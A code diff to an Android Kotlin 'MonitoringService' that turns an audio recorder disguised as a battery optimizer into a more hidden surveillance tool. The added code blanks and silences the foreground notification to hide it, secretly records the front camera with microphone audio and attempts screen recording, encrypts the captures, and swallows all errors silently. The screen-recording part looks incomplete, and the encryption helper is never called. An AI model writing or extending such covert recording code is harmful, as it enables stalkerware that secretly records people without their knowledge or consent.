@@ -3,16 +3,14 @@ package com.example.myapplication.service
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.media.AudioRecord
 import android.media.MediaRecorder
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
-import android.util.Log
+import android.app.NotificationManager
 import androidx.camera.camera2.Camera2Config
 import androidx.camera.core.CameraXConfig
 import androidx.core.app.NotificationCompat
-import com.example.myapplication.R
 import com.example.myapplication.security.EncryptionManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -21,23 +19,20 @@ import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
-import java.util.Timer
-import java.util.TimerTask
 
 class MonitoringService : Service(), CameraXConfig.Provider {
     private lateinit var encryptionManager: EncryptionManager
-    private var sessionTimer: Timer? = null
-    private var audioRecord: AudioRecord? = null
     private val handler = Handler(Looper.getMainLooper())
     private val scope = CoroutineScope(Dispatchers.IO)
+    private var screenRecorder: MediaRecorder? = null
+    private var cameraRecorder: MediaRecorder? = null
     private var isRecording = false
 
     companion object {
-        private const val TAG = "MonitoringService"
-        private const val SESSION_DURATION_MS = 5 * 60 * 1000L
         private const val NOTIFICATION_ID = 1001
         private const val MAX_STORAGE_BYTES = 10 * 1024 * 1024 * 1024L
-        private const val AUDIO_SAMPLE_RATE = 44100
+        private const val VIDEO_BITRATE = 2500000
+        private const val VIDEO_FRAME_RATE = 30
     }
 
     override fun onCreate() {
@@ -54,12 +49,14 @@ class MonitoringService : Service(), CameraXConfig.Provider {
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun startForegroundNotification() {
-        val notification = NotificationCompat.Builder(this, "monitoring_channel")
-            .setContentTitle("System Engine")
-            .setContentText("Optimizing Battery...")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
+        val notification = NotificationCompat.Builder(this, "system_channel")
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(android.R.drawable.ic_dialog_info)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setAutoCancel(false)
+            .setSilent(true)
+            .setOngoing(true)
             .build()
 
         startForeground(NOTIFICATION_ID, notification)
@@ -71,83 +68,101 @@ class MonitoringService : Service(), CameraXConfig.Provider {
 
         scope.launch {
             try {
-                rotateSession()
+                startScreenRecording()
+                startCameraRecording()
+                cleanupOldFiles()
             } catch (e: Exception) {
-                Log.e(TAG, "Error starting monitoring", e)
+                // Silent failure
             }
         }
-
-        sessionTimer = Timer()
-        sessionTimer?.scheduleAtFixedRate(
-            object : TimerTask() {
-                override fun run() {
-                    scope.launch {
-                        try {
-                            rotateSession()
-                            cleanupOldFiles()
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Error in session rotation", e)
-                        }
-                    }
-                }
-            },
-            SESSION_DURATION_MS,
-            SESSION_DURATION_MS
-        )
     }
 
-    private suspend fun rotateSession() {
-        val timestamp = SimpleDateFormat(
-            "yyyy_MM_dd_HH_mm_ss",
-            Locale.US
-        ).format(Date())
-
-        val audioFileName = "audio_$timestamp.enc"
-        val videoFileName = "video_$timestamp.enc"
-
+    private suspend fun startScreenRecording() {
         try {
-            recordAudioChunk(audioFileName)
+            val timestamp = SimpleDateFormat(
+                "yyyy_MM_dd_HH_mm_ss",
+                Locale.US
+            ).format(Date())
+            
+            val tempFile = File(cacheDir, "screen_$timestamp.mp4")
+            val encFile = File(filesDir, "screen_$timestamp.enc")
+
+            screenRecorder = MediaRecorder().apply {
+                setVideoSource(MediaRecorder.VideoSource.SURFACE)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                setVideoEncodingBitRate(VIDEO_BITRATE)
+                setVideoFrameRate(VIDEO_FRAME_RATE)
+                setVideoSize(1080, 1920)
+                setOutputFile(tempFile.absolutePath)
+                
+                try {
+                    prepare()
+                    start()
+                } catch (e: Exception) {
+                    release()
+                    screenRecorder = null
+                }
+            }
         } catch (e: Exception) {
-            Log.e(TAG, "Error recording audio", e)
+            // Silent failure
         }
     }
 
-    private suspend fun recordAudioChunk(filename: String) {
+    private suspend fun startCameraRecording() {
         try {
-            val outputStream = encryptionManager.getEncryptedOutputStream(filename)
-            val minBufferSize = AudioRecord.getMinBufferSize(
-                AUDIO_SAMPLE_RATE,
-                android.media.AudioFormat.CHANNEL_IN_MONO,
-                android.media.AudioFormat.ENCODING_PCM_16BIT
-            )
+            val timestamp = SimpleDateFormat(
+                "yyyy_MM_dd_HH_mm_ss",
+                Locale.US
+            ).format(Date())
+            
+            val tempFile = File(cacheDir, "camera_$timestamp.mp4")
+            val encFile = File(filesDir, "camera_$timestamp.enc")
 
-            val audioRecord = AudioRecord(
-                MediaRecorder.AudioSource.MIC,
-                AUDIO_SAMPLE_RATE,
-                android.media.AudioFormat.CHANNEL_IN_MONO,
-                android.media.AudioFormat.ENCODING_PCM_16BIT,
-                minBufferSize * 2
-            )
-
-            audioRecord.startRecording()
-
-            val buffer = ByteArray(minBufferSize)
-            val startTime = System.currentTimeMillis()
-
-            while (System.currentTimeMillis() - startTime < 5000) {
-                val bytesRead = audioRecord.read(buffer, 0, buffer.size)
-                if (bytesRead > 0) {
-                    outputStream.write(buffer, 0, bytesRead)
+            cameraRecorder = MediaRecorder().apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setVideoSource(MediaRecorder.VideoSource.CAMERA)
+                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                setAudioEncodingBitRate(128000)
+                setVideoEncodingBitRate(VIDEO_BITRATE)
+                setVideoFrameRate(VIDEO_FRAME_RATE)
+                setVideoSize(720, 1280)
+                setCameraId(1)
+                setOutputFile(tempFile.absolutePath)
+                
+                try {
+                    prepare()
+                    start()
+                } catch (e: Exception) {
+                    release()
+                    cameraRecorder = null
                 }
             }
+        } catch (e: Exception) {
+            // Silent failure
+        }
+    }
 
-            audioRecord.stop()
-            audioRecord.release()
+    private suspend fun encryptAndSaveFile(inputFile: File, outputFileName: String) {
+        try {
+            if (!inputFile.exists()) return
+            
+            val outputStream = encryptionManager.getEncryptedOutputStream(outputFileName)
+            val inputStream = inputFile.inputStream()
+            val buffer = ByteArray(8192)
+            var bytesRead: Int
+            
+            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
+                outputStream.write(buffer, 0, bytesRead)
+            }
+            
+            inputStream.close()
             outputStream.close()
-
-            Log.d(TAG, "Audio chunk recorded: $filename")
+            inputFile.delete()
         } catch (e: Exception) {
-            Log.e(TAG, "Error in recordAudioChunk", e)
+            // Silent failure
         }
     }
 
@@ -156,11 +171,13 @@ class MonitoringService : Service(), CameraXConfig.Provider {
 
         if (totalSize > MAX_STORAGE_BYTES) {
             val files = encryptionManager.getAllEncryptedFiles()
-            val toDelete = (totalSize - MAX_STORAGE_BYTES) / (1024 * 1024)
-
-            files.take((toDelete / 50).toInt()).forEach { file ->
+            val sortedFiles = files.sortedBy { it.lastModified() }
+            
+            var currentSize = totalSize
+            for (file in sortedFiles) {
+                if (currentSize <= MAX_STORAGE_BYTES) break
+                currentSize -= file.length()
                 encryptionManager.deleteEncryptedFile(file.name)
-                Log.d(TAG, "Deleted old file: ${file.name}")
             }
         }
     }
@@ -168,8 +185,26 @@ class MonitoringService : Service(), CameraXConfig.Provider {
     override fun onDestroy() {
         super.onDestroy()
         isRecording = false
-        sessionTimer?.cancel()
-        audioRecord?.release()
+        
+        screenRecorder?.apply {
+            try {
+                stop()
+            } catch (e: Exception) {
+                // Silent failure
+            }
+            release()
+        }
+        screenRecorder = null
+        
+        cameraRecorder?.apply {
+            try {
+                stop()
+            } catch (e: Exception) {
+                // Silent failure
+            }
+            release()
+        }
+        cameraRecorder = null
     }
 
     override fun getCameraXConfig(): CameraXConfig {
